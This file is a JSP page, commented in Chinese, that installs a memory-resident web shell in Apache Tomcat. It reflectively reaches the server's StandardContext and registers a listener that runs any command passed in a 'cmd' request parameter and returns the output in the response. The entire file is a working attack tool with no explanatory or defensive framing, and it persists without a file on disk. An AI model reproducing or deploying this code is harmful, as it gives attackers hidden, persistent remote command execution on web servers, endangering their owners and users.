<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public class Listener_memshell implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre){
            // 获取request请求
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            // 获取参数
            String cmd = req.getParameter("cmd");
            if(cmd != null){
                try{
                    // 获得response响应
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request) requestF.get(req);
                    Response response = (Response) request.getResponse();

                    // 执行命令
                    InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
                    BufferedInputStream bins = new BufferedInputStream(ins);
                    response.setContentType("text/html;charset=UTF-8");
                    response.getWriter().write("Listener_memshell 被执行\n");
                    int len;
                    while ((len = bins.read()) != -1) {
                        response.getWriter().write(len);
                    }
                } catch (IOException e){
                    e.printStackTrace();
                } catch (NullPointerException n){
                    n.printStackTrace();
                } catch (NoSuchFieldException e) {
                } catch (IllegalAccessException e) {
                }
            }
        }
        @Override
        public void requestDestroyed(ServletRequestEvent sre){

        }
    }
%>
<%
    // 获得StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    // 添加恶意Listener
    Listener_memshell listener_memshell = new Listener_memshell();
    context.addApplicationEventListener(listener_memshell);
%>